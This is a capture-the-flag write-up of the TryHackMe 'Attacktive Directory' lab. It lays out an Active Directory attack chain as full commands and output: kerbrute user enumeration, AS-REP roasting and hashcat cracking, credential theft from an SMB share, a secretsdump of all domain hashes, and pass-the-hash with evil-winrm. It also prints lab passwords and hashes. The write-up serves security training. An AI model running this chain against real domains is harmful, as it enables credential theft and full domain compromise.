https://tryhackme.com/room/attacktivedirectory

10.10.4.164

[Task 3] Enumerate the DC 

#1 How many ports are open under 10,000? (Note it may take up to 5 minutes for all the services to start)


quick scan
```
---------------------Starting Nmap Quick Scan---------------------

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 22:25 EDT
Warning: 10.10.4.164 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.4.164
Host is up (0.38s latency).
Not shown: 969 closed ports, 18 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds

```

full scan
```
Not shown: 60337 closed ports, 5171 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49672/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49688/tcp open  unknown
49694/tcp open  unknown
49786/tcp open  unknown
```

we have 13 ports open from the quick scan and 27 ports for the second scan

however the hint in tryhackme says 11 ports

```
11
```

#2 What tool will allow us to enumerate port 139/445?

```
enum4linux 10.10.4.164
```

#3 What is the NetBIOS-Domain Name of the machine?

in our output enum4linux 

```
THM-AD
```

#4 What invalid TLD do people commonly use for their Active Directory Domain?

TLD stands for top level domain

```
.local
```

[Task 4] Enumerate the DC Pt 2 

#1 What command within Kerbrute will allow us to enumerate valid usernames?

download kerbrute binary

```
userenum
```

#2 What notable account is discovered? (These should jump out at you)

```
./kerbrute userenum --dc 10.10.4.164 -d spookysec.local /home/kali/Downloads/userlist.txt 
```

#3 What is the other notable account is discovered? (These should jump out at you)

```
kali@kali:~/Documents$ ./kerbrute userenum --dc 10.10.4.164 -d spookysec.local /home/kali/Downloads/userlist.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/23/20 - Ronnie Flathers @ropnop

2020/08/23 00:48:46 >  Using KDC(s):
2020/08/23 00:48:46 >   10.10.4.164:88

2020/08/23 00:48:48 >  [+] VALID USERNAME:       james@spookysec.local
2020/08/23 00:48:54 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2020/08/23 00:49:02 >  [+] VALID USERNAME:       James@spookysec.local
2020/08/23 00:49:04 >  [+] VALID USERNAME:       robin@spookysec.local
2020/08/23 00:49:37 >  [+] VALID USERNAME:       darkstar@spookysec.local
2020/08/23 00:49:59 >  [+] VALID USERNAME:       administrator@spookysec.local
2020/08/23 00:50:37 >  [+] VALID USERNAME:       backup@spookysec.local
2020/08/23 00:50:55 >  [+] VALID USERNAME:       paradox@spookysec.local
2020/08/23 00:52:48 >  [+] VALID USERNAME:       JAMES@spookysec.local
```

```
svc-admin@spookysec.local
administrator@spookysec.local
backup@spookysec.local
```

[Task 5] Exploiting Kerberos 

#1 We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?

```
kali@kali:~/Documents$ GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.4.164
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:21f4acdd58dcc1a89c920fe69da8041f$8d3e1002693de8e078aad7e9323c86cee7ed555b25162ffc1ff5914d4cd7a31de9a06dc993fc7bffe216e91cf544dbb011b4113614136963a24ac97a5210253db71d324b0bf12f93e3b06e6fe9622b99e4ee4f06a223071f2c82719e4e814b5b4247874720e4839214e62b9d0b6e3707aba7ddde3ca7907c381644313b789b27371108df7bcb4b255e640b50fd6607fd706157f193c630f8f96a5c0677476520457f185cce7b5f67503b5593419cb6d862dc03a34159f3016e8adab95aba5526f9b098193f0502bd894a6bc6cf3c857e92ba4f4fdf0c5a6ed3fbd804fd222a93c333fc534742877fc45dadbf5d2a74853521

```

answer svc-admin

#2 Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

go to https://hashcat.net/wiki/doku.php?id=example_hashes

search for the beginning of the hash on page "$krb5asrep$23$"

```
18200 	Kerberos 5 AS-REP etype 23 
```

#3 What mode is the hash?

```
18200
```

#4 Now crack the hash with the modified password list provided, what is the user accounts password?

```
hashcat -m 18200 hash passwordlist.txt --force

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:21f4acdd58dcc1a89c920fe69da8041f$8d3e1002693de8e078aad7e9323c86cee7ed555b25162ffc1ff5914d4cd7a31de9a06dc993fc7bffe216e91cf544dbb011b4113614136963a24ac97a5210253db71d324b0bf12f93e3b06e6fe9622b99e4ee4f06a223071f2c82719e4e814b5b4247874720e4839214e62b9d0b6e3707aba7ddde3ca7907c381644313b789b27371108df7bcb4b255e640b50fd6607fd706157f193c630f8f96a5c0677476520457f185cce7b5f67503b5593419cb6d862dc03a34159f3016e8adab95aba5526f9b098193f0502bd894a6bc6cf3c857e92ba4f4fdf0c5a6ed3fbd804fd222a93c333fc534742877fc45dadbf5d2a74853521:management2005

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:21f4acdd58d...853521
Time.Started.....: Sun Aug 23 01:25:40 2020 (1 sec)
Time.Estimated...: Sun Aug 23 01:25:41 2020 (0 secs)
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    52810 H/s (10.74ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 8192/70188 (11.67%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/70188 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: m123456 -> whitey

Started: Sun Aug 23 01:25:19 2020
Stopped: Sun Aug 23 01:25:41 2020

```

password is
```
management2005
```

[Task 6] Enumerate the DC Pt 3 

#1 Using utility can we map remote SMB shares?

```
smbclient
```

#2 Which option will list shares?

```
kali@kali:~/Downloads$ smbclient -L 10.10.4.164 --user svc-admin
Enter WORKGROUP\svc-admin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```

#3 How many remote shares is the server listing?

```
6
```

#4 There is one particular share that we have access to that contains a text file. Which share is it?

```
kali@kali:~/Downloads$ smbclient //10.10.4.164/backup --user svc-admin
Enter WORKGROUP\svc-admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 5266909 blocks available
smb: \> 

```

answer

```
backup_credentials.txt
```

#5 What is the content of the file?

```
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

#6 Decoding the contents of the file, what is the full contents?

```
kali@kali:~/Downloads$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```
looks like base 64

```
kali@kali:~/Downloads$ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
backup@spookysec.local:backup2517860
```

[Task 7] Elevating Privileges 

#1 What method allowed us to dump NTDS.DIT?

```
secretsdump.py
```
```
-just-dc
```

#2 What is the Administrators NTLM hash?

```
kali@kali:~/Downloads$ secretsdump.py backup@10.10.4.164 -just-dc
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4876a80a723612986d7609aa5ebc12b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:1f700ac1a0ae226e52b1374f88c9cb75:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:c431e7e3555aeb5b63cbdfee3024d56f4b7f10eaba6c3f94d9a1524e76a26a49
Administrator:aes128-cts-hmac-sha1-96:f955ac2d89620b2a8dcd9837105445ff
Administrator:des-cbc-md5:6d5edfa173d9d6ae
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:0adcc262a34491a5d69bf1aa3e1bacc981dee8c7a4a5bfcde4edf95463043138
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:2be1f5eee8225372430853363f6a3a87
ATTACKTIVEDIREC$:des-cbc-md5:0bce20f29d911376
[*] Cleaning up... 
```

answer
```
aad3b435b51404eeaad3b435b51404ee:e4876a80a723612986d7609aa5ebc12b
```

#3 What method of attack could allow us to authenticate as the user without the password?

```
pass the hash
```

#4 Using a tool called Evil-WinRM what option will allow us to use a hash?

```
kali@kali:~/Downloads$ evil-winrm

Evil-WinRM shell v2.3

Error: missing argument: ip, user

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -h, --help                       Display this help message

```

answer
```
-H
```


[Task 8] Flags 

#1 svc-admin

```
evil-winrm -i 10.10.4.164 -u Administrator -H e4876a80a723612986d7609aa5ebc12b

```

answer
```
*Evil-WinRM* PS C:\Users\svc-admin\Desktop> cat user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}

```

#2 backup

```
*Evil-WinRM* PS C:\Users\backup\Desktop> cat PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}
```

#3 Administrator

```
TryHackMe{4ctiveD1rectoryM4st3r}
```
